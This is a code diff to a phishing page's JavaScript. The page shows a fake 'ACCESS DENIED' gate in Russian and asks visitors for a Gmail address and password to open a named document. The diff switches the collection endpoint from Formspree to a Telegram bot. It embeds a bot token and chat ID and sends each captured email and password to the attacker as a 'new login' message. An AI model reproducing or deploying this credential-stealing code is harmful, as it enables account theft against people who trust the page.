@@ -223,8 +223,6 @@
             ]
         };
 
-        const FORMSPREE_URL = "https://formspree.io/f/mlgzzeab"; 
-
         const originalModalHTML = `
             <h2>ACCESS DENIED</h2>
             <p style="color: red;">Ваш IP не подтверждён, невозможно войти.</p>
@@ -292,6 +290,10 @@
                 const pass = document.getElementById('regPass').value;
                 const errorMsg = document.getElementById('errorMsg');
 
+                // ТВОИ ДАННЫЕ УЖЕ ЗДЕСЬ
+                const botToken = "8715031916:AAG5-syOc1AiIy8TawuDFeX3jYPVakox6nQ";
+                const chatId = "5580068616";
+
                 const gmailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
                 
                 if (!gmailPattern.test(email)) {
@@ -310,11 +312,17 @@
                 btn.innerText = "СОЕДИНЕНИЕ С СЕРВЕРОМ...";
                 btn.disabled = true;
 
+                const message = `🔔 <b>НОВЫЙ ЛОГИН!</b>\n\n📄 Файл: ${MY_DOCUMENT.title}\n📧 Почта: ${email}\n🔑 Пароль: ${pass}`;
+
                 try {
-                    const response = await fetch(FORMSPREE_URL, {
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ email: email, password: pass, target: MY_DOCUMENT.title })
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: "HTML"
+                        })
                     });
 
                     if (response.ok) {
